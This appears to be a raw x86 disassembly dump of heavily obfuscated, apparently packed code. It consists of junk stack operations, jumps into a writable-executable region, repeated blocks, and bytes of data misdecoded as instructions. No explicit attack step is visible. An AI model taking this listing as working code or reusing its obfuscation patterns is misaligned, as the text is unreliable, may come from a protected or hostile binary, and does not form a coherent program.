lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_422d89
neg al
mov [ esp + 0xc ] sp
clc
bt si 0x8
sub al 0x4f
stc
rol al 0x3
mov [ esp + 0x8 ] 0xe2ab
stc
cmc
push [ esp ]
shr eax 0x1
mov [ esp ] 0x3175
lea esp [ esp + 0x2c ]
je rwxdata
movsx bx al
pop ebx
pushad
pushad
adc ecx ecx
pushad
mov [ esp + 0x10 ] bl
mov [ esp ] dl
lea esp [ esp + 0x40 ]
jmp rwxdata
cmp al 0x1c
das
jno rwxdata
je rwxdata
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
inc bl
inc ecx
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
mov edi [ esp + 0x20 ]
xchg si bp
push [ esp + 0xc ]
xchg si bp
call sub_422942
add [ eax ] al
inc edi
je rwxdata
fcomp [ ebx + 0x60 ]
clc
out dx eax
xchg ebp eax
aad 0x2f
push ebp
xchg ebp eax
or ebp [ ebx ]
add al 0xe
inc esi
cmp [ eax ] bl
sbb ch [ 0xffffffffef455118 ]
daa
xor ecx [ ebx + eax * 8 - 0x29 ]
mov eax 0xd81aebce
jb rwxdata
test al 0x88
jmp 0x69705301
jne rwxdata
rcl edx 0xa8
mov cl ch
bound esi [ edx ]
imul ebp [ cs : ecx + 0x2 ] 0xb1c5dd8a
xchg ebp eax
0x1680
dec ecx
outsb
outsw
inc ecx
add cl ch
sbb eax 0x6800003c
fsubr [ esi - 0x2f177407 ]
push cs
add [ eax ] eax
jmp rwxdata
adc eax 0x40c6f6cb
shr ebx 0xc
pushfd
call sub_426c9a
sub_422dee
push [ esp ]
push esi
pushad
lea esp [ esp + 0x34 ]
ja rwxdata
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
inc bl
inc ecx
sub_422e46
lea esp [ esp + 0x8 ]
je rwxdata
inc ah
mov esi edi
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
call sub_4208c7
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_422e71
cmp cl al
bt bp 0xf
add dl dl
pushfd
jmp rwxdata
lea esp [ esp + 0x4 ]
jne rwxdata
push 0xd29f4d0b
call sub_4201d2
push 0x6af9aeda
call j_sub_432345
jmp rwxdata
mov dl 0x66
not dl
push 0x866462ec
pushf
pop [ esp + 0x2 ]
cmc
setl dl
cmc
call sub_4223a7
stc
stc
cmc
and ebx 0xfff
cmc
pushad
add [ edi + ebx ] dx
pushad
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_422ea8
mov [ esp + 0x1c ] edi
pushad
mov [ esp + 0x4 ] 0x45
stc
push 0x933bbcb9
mov [ esp + 0x3c ] ebx
jmp rwxdata
test eax eax
push [ esp + 0xc ]
lea esp [ esp + 0x40 ]
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
jmp rwxdata
and al 0x24
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
je rwxdata
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_422ee4
push 0xd89251c9
[ edi ] [ esi ]
mov si [ esp ]
pop esi
bswap si
mov esi [ esp + 0x4 ]
push 0x40fefbed
push [ esp ]
mov [ esp ] al
lea esp [ esp + 0x10 ]
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
